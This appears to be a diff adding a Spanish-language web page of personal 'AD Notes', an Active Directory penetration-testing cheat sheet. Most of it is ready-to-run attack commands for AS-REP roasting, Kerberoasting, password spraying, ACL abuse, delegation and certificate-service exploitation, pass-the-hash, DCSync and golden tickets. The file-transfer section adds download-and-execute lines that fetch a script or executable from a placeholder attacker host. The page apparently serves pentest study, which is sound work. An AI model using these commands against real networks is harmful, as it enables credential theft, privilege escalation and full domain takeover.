@@ -1,0 +1,299 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
+<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a Apuntes
+</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> AD Notes </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h2 id="1-enumeración-inicial">1. Enumeración Inicial</h2>
+<h3 id="-desde-windows-nativo--powerviewad-module">🪟 Desde Windows (Nativo &#x26; PowerView/AD Module)</h3>
+<p><strong>Información Básica del Usuario y Grupos</strong></p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Quién soy y qué privilegios tengo</span></span>
+<span class="line"><span>whoami /all</span></span>
+<span class="line"><span>whoami /priv</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Enumerar Usuarios y Grupos</span></span>
+<span class="line"><span>Get-ADUser -Filter * | select SamAccountName</span></span>
+<span class="line"><span>Get-ADGroupMember -Identity "Domain Admins"</span></span>
+<span class="line"><span>Get-ADPrincipalGroupMembership -Identity &#x3C;usuario>  # Ver a qué grupos pertenece un usuario</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Enumerar Computadoras</span></span>
+<span class="line"><span>Get-ADComputer -Filter * | select Name</span></span></code></pre>
+<p><strong>Dominio y Bosque (Forest)</strong></p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Información del Bosque y Dominios</span></span>
+<span class="line"><span>Get-ADForest</span></span>
+<span class="line"><span>(Get-ADForest).Domains</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Relaciones de Confianza (Trusts)</span></span>
+<span class="line"><span>Get-ADTrust -Filter *</span></span>
+<span class="line"><span>Get-DomainTrustMapping  # PowerView</span></span>
+<span class="line"><span>Invoke-MapDomainTrust | Export-Csv trust.csv</span></span></code></pre>
+<p>Enumeración de ACLs (Listas de Control de Acceso)</p>
+<p>Busca “quién puede hacer qué” sobre otros objetos.</p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Buscar ACLs interesantes (PowerView)</span></span>
+<span class="line"><span>Find-InterestingDomainAcl -ResolveGUIDs</span></span>
+<span class="line"><span>Invoke-ACLScanner -ResolveGUIDs</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Ver permisos sobre un objeto específico</span></span>
+<span class="line"><span>Get-DomainObjectAcl -Identity "Administrator" -ResolveGUIDs -Verbose</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Ver mis permisos sobre el dominio</span></span>
+<span class="line"><span>Get-DomainObjectAcl -Identity $env:USERNAME -ResolveGUIDs</span></span></code></pre>
+<p><strong>GPO (Políticas de Grupo)</strong></p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Listar GPOs y enlaces</span></span>
+<span class="line"><span>Get-DomainGPO</span></span>
+<span class="line"><span>(Get-DomainOU -Identity "Students").gplink</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Buscar dónde un usuario es Admin Local vía GPO</span></span>
+<span class="line"><span>Find-GPOComputerAdmin –ComputerName &#x3C;TargetPC></span></span>
+<span class="line"><span>Find-GPOLocation -Identity &#x3C;usuario></span></span></code></pre>
+<h3 id="-desde-linux-kali--netexec--bloodhound">🐧 Desde Linux (Kali / NetExec / BloodHound)</h3>
+<p>NetExec (SMB &#x26; LDAP)</p>
+<p>La navaja suiza para enumeración rápida.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Enumeración básica (SMB)</span></span>
+<span class="line"><span>nxc smb &#x3C;IP> -u user -p pass --users --groups --loggedon</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Enumeración de Dominio (LDAP)</span></span>
+<span class="line"><span>nxc ldap &#x3C;IP> -u user -p pass --trusted-for-delegation  # Delegaciones</span></span>
+<span class="line"><span>nxc ldap &#x3C;IP> -u user -p pass --asreproast              # Usuarios ASREPRoast</span></span>
+<span class="line"><span>nxc ldap &#x3C;IP> -u user -p pass --kerberoasting           # Usuarios Kerberoast</span></span>
+<span class="line"><span>nxc ldap &#x3C;IP> -u user -p pass -M laps                   # Chequear LAPS</span></span></code></pre>
+<p><strong>BloodHound (Recolección)</strong></p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Remoto (Python)</span></span>
+<span class="line"><span>bloodhound-python -u user -p pass -ns &#x3C;IP_DC> -d &#x3C;dominio> -c All</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Local (SharpHound.exe en Windows)</span></span>
+<span class="line"><span>.\SharpHound.exe --collectionmethods All</span></span></code></pre>
+<hr>
+<h2 id="2-ataques-de-kerberos">2. Ataques de Kerberos</h2>
+<h3 id="as-rep-roasting">AS-REP Roasting</h3>
+<p>Ataca usuarios que tienen “Do not require Kerberos preauthentication”.</p>
+<ul>
+<li><strong>Concepto:</strong> Solicitas un ticket AS-REP (cifrado con el hash del usuario) sin enviar credenciales. Luego lo crackeas.</li>
+</ul>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Linux (Impacket)</span></span>
+<span class="line"><span>impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip &#x3C;IP_DC></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Windows (Rubeus)</span></span>
+<span class="line"><span>.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt</span></span></code></pre>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p>Ataca cuentas de servicio (Service Accounts) identificadas por tener un SPN.</p>
+<ul>
+<li><strong>Concepto:</strong> Solicitas un ticket TGS para un servicio. El ticket viene cifrado con el hash NTLM de la cuenta de servicio.</li>
+</ul>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Linux (Impacket)</span></span>
+<span class="line"><span>impacket-GetUserSPNs -dc-ip &#x3C;IP_DC> domain/user:pass -request</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Windows (Rubeus)</span></span>
+<span class="line"><span>.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt</span></span></code></pre>
+<h3 id="pulverizado-de-contraseñas">Pulverizado de contraseñas</h3>
+<p>Prueba una contraseña común contra muchos usuarios para evitar bloqueos.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Kerbrute (Linux) - Más sigiloso (Pre-Auth check)</span></span>
+<span class="line"><span>./kerbrute passwordspray -d domain.local --dc &#x3C;IP_DC> users.txt 'Password123'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Script para rociado de contraseñas</span></span>
+<span class="line"><span>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span></code></pre>
+<hr>
+<h2 id="3-escalada-de-privilegios-abuso-de-acls">3. Escalada de Privilegios (Abuso de ACLs)</h2>
+<p>Si tienes permisos especiales sobre objetos, úsalos para tomar control.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Permiso</strong></th><th><strong>Acción</strong></th><th><strong>Comando (BloodyAD - Kali)</strong></th></tr></thead><tbody><tr><td><strong>GenericAll / WriteDACL</strong></td><td>Darte permisos DCSync</td><td><code>bloodyAD -d domain -u user -p pass add dcsync 'user_attacker'</code></td></tr><tr><td><strong>GenericWrite / All</strong></td><td>Resetear Password</td><td><code>bloodyAD -d domain -u user -p pass set password 'Target' 'NewPass!'</code></td></tr><tr><td><strong>WriteOwner</strong></td><td>Hacerte dueño del objeto</td><td><code>bloodyAD -d domain -u user -p pass set owner 'Target' 'Attacker'</code></td></tr><tr><td><strong>AddKeyCredentialLink</strong></td><td>Shadow Credentials</td><td><code>certipy shadow auto -u user -p pass -account target</code></td></tr><tr><td><strong>ForceChangePassword</strong></td><td>Cambiar pass (sin saber el anterior)</td><td><code>net rpc password "Target" "NewPass" -U user%pass -S &#x3C;IP></code></td></tr></tbody></table>
+<hr>
+<h2 id="4-delegación-de-kerberos">4. Delegación de Kerberos</h2>
+<h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
+<p>La máquina guarda los TGTs de cualquiera que se conecte a ella.</p>
+<ul>
+<li>
+<p><strong>Ataque:</strong> Comprometer la máquina, extraer TGTs (especialmente de Domain Admins) y reusarlos.</p>
+</li>
+<li>
+<p><strong>Herramienta:</strong> <code>Rubeus monitor</code> + <code>SpoolSample</code> (PrinterBug) para forzar al DC a conectarse.</p>
+</li>
+</ul>
+<h3 id="constrained-delegation">Constrained Delegation</h3>
+<p>La cuenta solo puede delegar a servicios específicos, <em>pero</em> si tienes el hash, puedes solicitar tickets para <em>cualquier</em> usuario hacia ese servicio.</p>
+<ul>
+<li>
+<p><strong>Requisito:</strong> Hash NTLM del usuario/máquina con delegación.</p>
+</li>
+<li>
+<p><strong>Comando (Impacket):</strong></p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>getST.py -spn cifs/target 'domain/user:pass' -impersonate Administrator</span></span></code></pre>
+</li>
+</ul>
+<h3 id="resource-based-constrained-delegation-rbcd">Resource-Based Constrained Delegation (RBCD)</h3>
+<p>La delegación se configura en el objeto <em>destino</em> (la víctima), no en el origen.</p>
+<ul>
+<li>
+<p><strong>Requisito:</strong> Permiso <code>GenericWrite</code> o <code>WriteProperty</code> sobre la máquina víctima.</p>
+</li>
+<li>
+<p><strong>Ataque:</strong></p>
+<ol>
+<li>
+<p>Crear una máquina falsa (<code>addcomputer.py</code>).</p>
+</li>
+<li>
+<p>Escribir en <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> de la víctima apuntando a tu máquina falsa (<code>rbcd.py</code>).</p>
+</li>
+<li>
+<p>Pedir ticket de servicio (<code>getST.py</code>).</p>
+</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h2 id="5-active-directory-certificate-services-adcs">5. Active Directory Certificate Services (ADCS)</h2>
+<p>Herramienta principal: <strong>Certipy</strong> (Linux) o <strong>Certify</strong> (Windows).</p>
+<h3 id="enumeración-de-vulnerabilidades">Enumeración de Vulnerabilidades</h3>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Buscar plantillas vulnerables (ESC1, ESC8, etc.)</span></span>
+<span class="line"><span>certipy find -u user@domain -p pass -dc-ip &#x3C;IP> -vulnerable -stdout</span></span></code></pre>
+<h3 id="vectores-principales">Vectores Principales</h3>
+<ul>
+<li>
+<p><strong>ESC1:</strong> Plantilla permite <code>Client Authentication</code> y <code>Enrollee Supplies Subject</code> (tú dices quién eres).</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Explotación</span></span>
+<span class="line"><span>certipy req -u user -p pass -ca &#x3C;CA_NAME> -template ESC1 -upn Administrator</span></span>
+<span class="line"><span>certipy auth -pfx administrator.pfx</span></span></code></pre>
+</li>
+<li>
+<p><strong>ESC8 (Relay):</strong> El servidor ADCS tiene Web Enrollment (HTTP) habilitado.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Explotación</span></span>
+<span class="line"><span>1. certipy relay -target &#x3C;IP_ADCS> -template DomainController</span></span>
+<span class="line"><span>2. Coercer / PetitPotam para forzar al DC a autenticarse contra ti.</span></span></code></pre>
+</li>
+<li>
+<p><strong>ESC4:</strong> Tienes permisos de escritura sobre una plantilla. La modificas para hacerla vulnerable a ESC1.</p>
+</li>
+<li>
+<p><strong>Certifried (CVE-2022-26923):</strong> Creas una máquina, cambias su <code>dnsHostName</code> para que coincida con el DC, y pides certificado.</p>
+</li>
+</ul>
+<hr>
+<h2 id="6-movimiento-lateral">6. Movimiento Lateral</h2>
+<h3 id="ejecución-remota">Ejecución Remota</h3>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># WinRM (PowerShell Remoting) - Puerto 5985</span></span>
+<span class="line"><span>evil-winrm -i &#x3C;IP> -u user -p pass</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># SMB (PsExec / SmbExec) - Puerto 445</span></span>
+<span class="line"><span>impacket-psexec domain/user:pass@&#x3C;IP></span></span>
+<span class="line"><span>impacket-smbexec domain/user:pass@&#x3C;IP></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># WMI (Más sigiloso)</span></span>
+<span class="line"><span>impacket-wmiexec domain/user:pass@&#x3C;IP></span></span></code></pre>
+<h3 id="pass-the-hash-pth--pass-the-ticket-ptt">Pass-The-Hash (PTH) &#x26; Pass-The-Ticket (PTT)</h3>
+<ul>
+<li>
+<p><strong>PTH:</strong> Usar el hash NTLM en lugar de la contraseña.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nxc smb &#x3C;IP> -u Administrator -H &#x3C;NTLM_HASH></span></span></code></pre>
+</li>
+<li>
+<p><strong>PTT:</strong> Inyectar un ticket Kerberos (<code>.ccache</code> o <code>.kirbi</code>) en la sesión.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>export KRB5CCNAME=ticket.ccache</span></span>
+<span class="line"><span>impacket-psexec -k -no-pass target</span></span></code></pre>
+</li>
+</ul>
+<hr>
+<h2 id="7-persistencia-y-dominio-total">7. Persistencia y Dominio Total</h2>
+<h3 id="dcsync">DCSync</h3>
+<p>Simula ser un Controlador de Dominio para pedirle al DC real que replique las contraseñas (hashes).</p>
+<ul>
+<li>
+<p><strong>Requisito:</strong> Permisos <code>Replicating Directory Changes All</code>.</p>
+</li>
+<li>
+<p><strong>Comando:</strong></p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-secretsdump domain/user:pass@&#x3C;IP_DC> -just-dc-ntlm</span></span></code></pre>
+</li>
+</ul>
+<h3 id="golden-ticket">Golden Ticket</h3>
+<p>Falsificación total. Teniendo el hash <code>krbtgt</code>, puedes crear tickets válidos para cualquier usuario (incluso inexistentes) con persistencia de 10 años.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Linux</span></span>
+<span class="line"><span>ticketer.py -nthash &#x3C;KRBTGT_HASH> -domain-sid &#x3C;SID> -domain &#x3C;DOMINIO> Administrator</span></span></code></pre>
+<h3 id="laps-y-gmsa">LAPS y gMSA</h3>
+<p>Recuperación de contraseñas gestionadas.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Leer password de LAPS</span></span>
+<span class="line"><span>nxc ldap &#x3C;IP> -u user -p pass -M laps</span></span>
+<span class="line"><span>bloodyAD -d domain -u user -p pass get search --filter '(ms-mcs-admpwd=*)'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Leer password de gMSA</span></span>
+<span class="line"><span>nxc ldap &#x3C;IP> -u user -p pass --gmsa</span></span></code></pre>
+<hr>
+<h2 id="8-transferencia-de-archivos">8. Transferencia de Archivos</h2>
+<p>Métodos rápidos para subir herramientas al objetivo.</p>
+<p><strong>PowerShell (Fileless / Memoria)</strong></p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Descargar y ejecutar en memoria (Bypass disco)</span></span>
+<span class="line"><span>IEX (New-Object Net.WebClient).DownloadString('http://ATACANTE/script.ps1')</span></span></code></pre>
+<p><strong>CertUtil (Windows Nativo)</strong></p>
+<p>PowerShell</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Descargar archivo</span></span>
+<span class="line"><span>certutil -urlcache -split -f "http://ATACANTE/file.exe" "C:\Temp\file.exe"</span></span></code></pre>
+<p><strong>SMB Server (Python)</strong></p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># En Kali</span></span>
+<span class="line"><span>impacket-smbserver share ./carpeta_local -smb2support</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># En Windows (Víctima)</span></span>
+<span class="line"><span>copy \\IP_KALI\share\file.exe C:\Windows\Temp\file.exe</span></span></code></pre> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de proyectos
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2025 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
